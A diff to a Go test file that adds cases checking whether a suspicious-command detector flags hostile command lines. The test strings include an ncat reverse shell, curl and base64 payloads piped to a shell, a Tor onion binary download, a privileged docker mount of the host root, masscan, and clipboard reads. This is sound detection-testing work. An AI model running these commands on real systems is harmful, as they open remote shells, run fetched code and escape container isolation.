@@ -88,4 +88,22 @@ func TestProcessHeuristics(t *testing.T) {
 	if suspiciousCommand("ncat 1.2.3.4 4444 --exec /bin/sh") != "ncat_exec" {
 		t.Fatal("ncat exec not detected")
 	}
+	if suspiciousCommand("masscan 0.0.0.0/0 -p22") != "internet_scan_tool" {
+		t.Fatal("masscan not detected")
+	}
+	if suspiciousCommand("curl -fsSL http://bad/p.sh | sh") != "downloader_piped_to_shell" {
+		t.Fatal("curl|sh downloader not detected")
+	}
+	if suspiciousCommand("echo ZXZpbA== | base64 -d | bash") != "encoded_shell_payload" {
+		t.Fatal("base64 shell payload not detected")
+	}
+	if suspiciousCommand("torsocks wget http://abc.onion:9000/binary/system-linux-x86_64") != "tor_onion_downloader" {
+		t.Fatal("Tor onion downloader not detected")
+	}
+	if suspiciousCommand("docker run --privileged -v /:/host alpine sh") != "suspicious_docker_host_access" {
+		t.Fatal("suspicious docker host mount not detected")
+	}
+	if suspiciousCommand("xclip -selection clipboard -o") != "clipboard_access" {
+		t.Fatal("clipboard access not detected")
+	}
 }
